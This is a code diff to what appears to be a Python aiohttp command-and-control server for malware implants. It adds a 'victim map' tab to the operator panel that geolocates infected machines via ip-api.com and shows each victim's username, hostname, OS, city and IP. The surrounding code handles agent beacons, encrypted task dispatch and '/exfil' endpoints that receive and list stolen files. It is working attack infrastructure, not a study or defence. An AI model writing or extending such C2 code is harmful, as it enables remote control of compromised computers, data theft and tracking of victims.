@@ -186,6 +186,26 @@ tr.selected td:first-child{border-left:2px solid #00ff41}
   .clabel{min-width:44px;width:44px}
   .terminal{height:280px}
 }
+/* ── Tabs ─────────────────────────────────────────────────────────────── */
+.tab-btn{background:transparent;border:none;border-bottom:3px solid transparent;color:#8888b8;font-family:inherit;font-size:.75em;letter-spacing:1px;text-transform:uppercase;padding:0 20px;height:38px;cursor:pointer;transition:all .15s;white-space:nowrap}
+.tab-btn:hover{color:#00cc33;background:#0a110a}
+.tab-btn.active{color:#00ff41;border-bottom-color:#00ff41;background:#060e06;font-weight:700}
+/* ── Victim map ───────────────────────────────────────────────────────── */
+#victim-map{background:#06060d}
+.leaflet-container{background:#06060d!important;font-family:inherit}
+.leaflet-bar{border:1px solid #00ff4155!important;box-shadow:0 2px 12px rgba(0,255,65,.15)!important;border-radius:4px!important;overflow:hidden}
+.leaflet-bar a,.leaflet-bar a:hover{background:#0d1a0d!important;color:#00ff41!important;border-bottom:1px solid #00ff4133!important;width:28px!important;height:28px!important;line-height:28px!important;font-size:16px!important;font-weight:700!important;text-align:center!important;display:block!important;text-decoration:none!important}
+.leaflet-bar a:last-child{border-bottom:none!important}
+.leaflet-bar a:hover{background:#162e16!important;color:#00ff41!important}
+.leaflet-bar a.leaflet-disabled{color:#00ff4133!important;cursor:default!important}
+.victim-pin{width:18px;height:18px;border-radius:50%;background:#00ff41;border:3px solid #003a10;box-shadow:0 0 14px #00ff4199;animation:ping 2s ease-out infinite;cursor:pointer}
+.victim-pin::after{content:'';position:absolute;inset:-6px;border-radius:50%;border:2px solid #00ff4155;animation:ring 2s ease-out infinite}
+@keyframes ping{0%{box-shadow:0 0 0 0 #00ff4188}70%{box-shadow:0 0 0 16px transparent}100%{box-shadow:0 0 0 0 transparent}}
+@keyframes ring{0%{transform:scale(1);opacity:.8}100%{transform:scale(2.2);opacity:0}}
+.victim-popup{background:#0d0d18!important;border:1px solid #00ff41!important;border-radius:4px;color:#c0c0e0;font-size:.78em;font-family:monospace}
+.victim-popup .leaflet-popup-content-wrapper{background:#0d0d18;border:1px solid #00ff41;border-radius:4px;box-shadow:0 0 20px #00ff4133}
+.victim-popup .leaflet-popup-tip{background:#00ff41}
+.victim-popup .leaflet-popup-content{color:#c0c0e0;font-size:.82em;line-height:1.6}
 </style>
 </head>
 <body>
@@ -287,15 +307,26 @@ tr.selected td:first-child{border-left:2px solid #00ff41}
       </div>
     </div>
   </div>
-  <!-- Results panel -->
-  <div class="panel">
-    <div class="panel-title">Resultados &mdash; <span id="res-agent" style="color:#00cc33">selecciona un agente</span><span id="res-count" style="color:#6666a0;margin-left:8px"></span></div>
-    <div class="results-body" id="results-body"><div class="empty">Selecciona un agente</div></div>
+  <!-- Right panel: tabs Resultados / Mapa -->
+  <div class="panel" style="display:flex;flex-direction:column;min-height:0">
+    <div class="panel-title" style="gap:0;padding:0">
+      <button class="tab-btn active" id="tab-res" onclick="switchTab('res')">Resultados</button>
+      <button class="tab-btn" id="tab-map" onclick="switchTab('map')">&#127758; Equipos Vulnerados</button>
+      <span style="flex:1"></span>
+      <span id="res-agent" style="color:#00cc33;font-size:.72em;padding:0 14px">selecciona un agente</span>
+      <span id="res-count" style="color:#6666a0;font-size:.72em;padding-right:14px"></span>
+    </div>
+    <div id="pane-res" class="results-body" style="flex:1;min-height:0"><div class="empty">Selecciona un agente</div></div>
+    <div id="pane-map" style="flex:1;min-height:0;display:none;position:relative">
+      <div id="victim-map" style="width:100%;height:100%"></div>
+    </div>
   </div>
 </div>
 <div class="toast" id="toast"></div>
 <div class="statusbar"><span id="st-left">Conectando...</span><span id="st-right"></span></div>
 
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
 let sel=null,agents=[],cmdHist=[],histIdx=-1,waitTask=null,currentOS='linux';
 const esc=s=>s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
@@ -529,8 +560,8 @@ async function refreshResults(){
     const r=await fetch('/agents/'+sel+'/results');
     const data=await r.json();
     document.getElementById('res-count').textContent=data.length?'('+data.length+')':''
-    if(!data.length){document.getElementById('results-body').innerHTML='<div class="empty">Sin resultados aún</div>';return;}
-    document.getElementById('results-body').innerHTML=[...data].reverse().map(r=>
+    if(!data.length){document.getElementById('pane-res').innerHTML='<div class="empty">Sin resultados aún</div>';return;}
+    document.getElementById('pane-res').innerHTML=[...data].reverse().map(r=>
       '<div class="r-entry">'+
       '<div class="r-meta"><b>'+(r.task_id||'?').slice(0,8)+'</b> &nbsp; exit <span class="'+(r.exit_code===0?'ok':'errc')+'">'+r.exit_code+'</span> &nbsp; '+ts2s(r.ts)+'</div>'+
       (r.stdout?'<div class="r-out">'+esc(r.stdout.trimEnd())+'</div>':'')+
@@ -549,6 +580,73 @@ setOS('linux');
 refresh();
 setInterval(refresh,3000);
 setInterval(()=>{if(sel&&!waitTask)refreshResults();},5000);
+
+// ── Tabs ──────────────────────────────────────────────────────────────
+function switchTab(name){
+  document.getElementById('pane-res').style.display = name==='res'?'':'none';
+  document.getElementById('pane-map').style.display = name==='map'?'':'none';
+  document.getElementById('tab-res').classList.toggle('active', name==='res');
+  document.getElementById('tab-map').classList.toggle('active', name==='map');
+  if(name==='map'){ initMap(); pollGeo(); }
+}
+
+// ── Victim map ────────────────────────────────────────────────────────
+let _map = null, _markers = {}, _geoInterval = null;
+
+function initMap(){
+  if(_map) return;
+  _map = L.map('victim-map', {
+    center:[20,0], zoom:2,
+    zoomControl:false,
+    attributionControl:false,
+    zoomSnap:0.5,
+    wheelPxPerZoomLevel:120,
+  });
+  L.control.zoom({position:'bottomright'}).addTo(_map);
+  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+    maxZoom: 19,
+    attribution: ''
+  }).addTo(_map);
+}
+
+function pollGeo(){
+  if(_geoInterval) return;
+  fetchGeo();
+  _geoInterval = setInterval(fetchGeo, 5000);
+}
+
+async function fetchGeo(){
+  if(!_map) return;
+  try{
+    const r = await fetch('/geo');
+    const list = await r.json();
+    const seen = new Set();
+    for(const e of list){
+      seen.add(e.agent_id);
+      const key = e.agent_id;
+      const label = `<span style="color:#00ff41;font-weight:600">${e.username||e.agent_id.slice(0,8)}</span>
+        <br><span style="color:#8888b8">${e.hostname||''}</span>
+        <br><span style="color:#6666a0">${e.os_name||''}</span>
+        <br><span style="color:#556655">${e.city}, ${e.country}</span>
+        <br><span style="color:#334433;font-size:.85em">${e.ip}</span>
+        <br><span class="dot ${e.status}" style="margin-right:4px"></span>${e.status}`;
+      if(_markers[key]){
+        _markers[key].setPopupContent(label);
+      } else {
+        const icon = L.divIcon({className:'',html:'<div style="position:relative;width:18px;height:18px"><div class="victim-pin"></div></div>',iconSize:[18,18],iconAnchor:[9,9]});
+        const m = L.marker([e.lat,e.lon],{icon})
+          .bindPopup(label,{className:'victim-popup',maxWidth:220})
+          .addTo(_map);
+        m.openPopup();
+        _markers[key] = m;
+      }
+    }
+    // quita agentes que ya no están
+    for(const k of Object.keys(_markers)){
+      if(!seen.has(k)){ _map.removeLayer(_markers[k]); delete _markers[k]; }
+    }
+  }catch(_){}
+}
 </script>
 </body>
 </html>"""
@@ -581,6 +679,7 @@ agents:   dict = {}           # agent_id -> AgentState
 results:  dict = {}           # agent_id -> [ResultEntry]
 tasks:    dict = {}           # agent_id -> asyncio.Queue (PENDING)
 inflight: dict = {}           # agent_id -> {task_id -> {task, dispatched_at, timeout_s}}
+_geo:     dict = {}           # agent_id -> {lat, lon, city, country, ip}
 
 
 # ---------------------------------------------------------------------------
@@ -630,8 +729,9 @@ def _validate_agent_id(agent_id: str) -> bool:
     return bool(agent_id) and bool(_AGENT_ID_RE.match(agent_id))
 
 
-def _ensure_agent(agent_id: str) -> None:
-    if agent_id not in agents:
+def _ensure_agent(agent_id: str, ip: str = "") -> None:
+    is_new = agent_id not in agents
+    if is_new:
         agents[agent_id] = {
             "agent_id":      agent_id,
             "last_seen":     time.time(),
@@ -646,6 +746,8 @@ def _ensure_agent(agent_id: str) -> None:
         tasks[agent_id]    = asyncio.Queue(maxsize=TASK_QUEUE_MAX)
         inflight[agent_id] = {}
         log.info("NEW   agent_id=%.8s", agent_id)
+        if ip and agent_id not in _geo:
+            asyncio.ensure_future(_geolocate(agent_id, ip))
     else:
         agents[agent_id]["last_seen"] = time.time()
         agents[agent_id]["status"]    = "online"
@@ -677,8 +779,9 @@ def _complete_task(agent_id: str, task_id: str) -> None:
 # ---------------------------------------------------------------------------
 
 async def handle_nexus(request: web.Request) -> web.Response:
-    body       = await request.read()
+    body           = await request.read()
     session_id_hex = request.headers.get("X-Session-Id")
+    client_ip      = request.headers.get("X-Forwarded-For", request.remote or "").split(",")[0].strip()
 
     if not body:
         return web.Response(
@@ -706,7 +809,7 @@ async def handle_nexus(request: web.Request) -> web.Response:
                     body=pack_clear(MSG_ERROR), status=400,
                     content_type="application/octet-stream",
                 )
-            return await _dispatch_encrypted(msg_type, payload, sess, session_id_hex)
+            return await _dispatch_encrypted(msg_type, payload, sess, session_id_hex, client_ip)
 
     # ── Clear frames: HELLO always allowed; BEACON/RESULT only if NEXUS_ALLOW_CLEAR=1 ──
     msg_type, payload = unpack_clear(body)
@@ -723,7 +826,7 @@ async def handle_nexus(request: web.Request) -> web.Response:
         )
 
     if msg_type == MSG_BEACON:
-        return await _handle_beacon_clear(payload)
+        return await _handle_beacon_clear(payload, client_ip)
 
     if msg_type == MSG_RESULT:
         return await _handle_result_clear(payload)
@@ -752,7 +855,7 @@ async def _handle_hello(body: bytes) -> web.Response:
     return web.Response(body=welcome, content_type="application/octet-stream")
 
 
-async def _handle_beacon_clear(payload: bytes) -> web.Response:
+async def _handle_beacon_clear(payload: bytes, client_ip: str = "") -> web.Response:
     """Fase 1-2: BEACON in clear — parse JSON, register agent, return NOP or TASK."""
     try:
         data     = json.loads(payload.decode("utf-8"))
@@ -766,7 +869,7 @@ async def _handle_beacon_clear(payload: bytes) -> web.Response:
         return web.Response(body=pack_clear(MSG_ERROR), status=400,
                             content_type="application/octet-stream")
 
-    _ensure_agent(agent_id)
+    _ensure_agent(agent_id, client_ip)
     if data.get("hostname"):
         agents[agent_id]["hostname"] = data["hostname"]
     if data.get("username"):
@@ -820,7 +923,7 @@ async def _handle_result_clear(payload: bytes) -> web.Response:
 
 
 async def _dispatch_encrypted(
-    msg_type: int, payload: bytes, sess: "SessionState", sid_hex: str
+    msg_type: int, payload: bytes, sess: "SessionState", sid_hex: str, client_ip: str = ""
 ) -> web.Response:
     """Fase 3+: handle decrypted payload."""
     sess.last_seen = time.time()
@@ -837,10 +940,10 @@ async def _dispatch_encrypted(
             agent_id = None
         if agent_id and sess.agent_id is None:
             sess.agent_id = agent_id
-            _ensure_agent(agent_id)
+            _ensure_agent(agent_id, client_ip)
             log.info("BEACON(enc) agent_id=%.8s (first, session=%.8s)", agent_id, sid_hex)
         elif agent_id:
-            _ensure_agent(agent_id)
+            _ensure_agent(agent_id, client_ip)
             log.info("BEACON(enc) agent_id=%.8s", agent_id)
         if agent_id and agent_id in agents:
             if data.get("hostname"):
@@ -1003,6 +1106,43 @@ async def api_exfil_list(request: web.Request) -> web.Response:
                     "path": fpath,
                 })
     return web.json_response(files)
+
+
+async def _geolocate(agent_id: str, ip: str) -> None:
+    """Consulta ip-api.com en background y guarda lat/lon del agente."""
+    if ip in ("127.0.0.1", "::1") or ip.startswith("192.168.") or ip.startswith("10."):
+        _geo[agent_id] = {"lat": 6.2442, "lon": -75.5812,
+                          "city": "Local", "country": "LAN", "ip": ip}
+        return
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.get(f"http://ip-api.com/json/{ip}?fields=status,lat,lon,city,country",
+                             timeout=aiohttp.ClientTimeout(total=5)) as r:
+                data = await r.json()
+        if data.get("status") == "success":
+            _geo[agent_id] = {
+                "lat":     data["lat"],
+                "lon":     data["lon"],
+                "city":    data.get("city", ""),
+                "country": data.get("country", ""),
+                "ip":      ip,
+            }
+    except Exception:
+        pass
+
+
+async def api_geo(request: web.Request) -> web.Response:
+    """GET /geo — posiciones geográficas de todos los agentes."""
+    out = []
+    for agent_id, geo in _geo.items():
+        a = agents.get(agent_id, {})
+        out.append({**geo,
+                    "agent_id": agent_id,
+                    "username": a.get("username", ""),
+                    "hostname": a.get("hostname", ""),
+                    "os_name":  a.get("os_name", ""),
+                    "status":   a.get("status", "offline")})
+    return web.json_response(out)
 
 
 async def handle_panel(request: web.Request) -> web.Response:
@@ -1284,5 +1424,6 @@ def build_app() -> web.Application:
     app.router.add_get("/agents/{agent_id}/results", api_get_results)
     app.router.add_post("/exfil",                    api_exfil_receive)
     app.router.add_get("/exfil",                     api_exfil_list)
+    app.router.add_get("/geo",                       api_geo)
     app.on_startup.append(_on_startup)
     return app
